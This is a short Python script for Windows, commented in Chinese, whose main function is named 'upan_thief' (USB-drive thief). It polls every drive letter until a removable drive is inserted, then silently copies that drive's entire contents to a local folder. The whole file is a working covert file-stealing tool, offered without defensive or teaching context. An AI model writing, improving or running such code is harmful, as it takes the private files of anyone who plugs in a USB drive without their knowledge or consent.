import os
import time
from datetime import datetime
import shutil
from win32 import win32file

sign_1 = False


def upan_thief():
    """主程序"""
    
    global sign_1

    #盘符列表
    hard_disk=[]
    hard_disk_all=["A:/", "B:/","C:/","D:/","E:/","F:/","G:/","H:/","I:/",
               "J:/","K:/","L:/","M:/","N:/","O:/","P:/","Q:/","R:/",
               "S:/","T:/","U:/","V:/","W:/","X:/","Y:/","Z:/"]

    a = True

    #循环遍历实现5s扫描一次是否有新的可移动硬盘接入
    while (a == True):
        for i in range(26):
            if win32file.GetDriveType(hard_disk_all[i]) == 2:
                hard_disk.append(hard_disk_all[i])
        if len(hard_disk) > 0:
            a = False
        else:
            time.sleep(5)

    # U盘的盘符
    usb_path = hard_disk[0]
    # 要复制到的路径
    save_path = "data"

    #一直处于循环，直到检测到U盘存在
    b = True

    #循环检查是否存在可移动硬盘并静默拷贝其所有信息
    while (b == True):
        if os.path.exists(usb_path):
            shutil.copytree(usb_path, save_path)
            sign_1 = True
            break
        else:
            time.sleep(3)
            break
